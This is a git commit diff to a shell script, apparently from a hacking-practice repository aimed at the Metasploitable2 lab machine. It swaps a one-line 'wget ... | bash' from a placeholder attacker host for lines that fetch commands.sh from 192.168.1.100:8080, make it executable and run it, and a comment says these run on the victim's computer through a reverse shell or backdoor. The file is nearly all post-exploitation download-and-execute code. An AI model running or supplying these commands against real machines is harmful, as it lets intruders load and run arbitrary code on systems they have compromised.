9fc15a2363fd087eadfd3fe320d4a5983a207d36
hellcard <wseven347.devopser@gmail.com>
2025-01-09 21:06:43 -0700

    Update reverse-sh-or-metasploitable2-commands.sh

--- reverse-sh-or-metasploitable2-commands.sh
+++ reverse-sh-or-metasploitable2-commands.sh
@@ -1,1 +1,6 @@
-wget <IP addr kali | server>:8080/commands.sh | bash
+# here are the commands required to download the commands.sh script and run it, they can be executed as soon as we are on the victim’s computer using a reverse shell or backdoor
+
+# wget <IP addr kali | server>:8080/commands.sh
+wget 192.168.1.100:8080/commands.sh
+chmod +x commands.sh
+./commands.sh
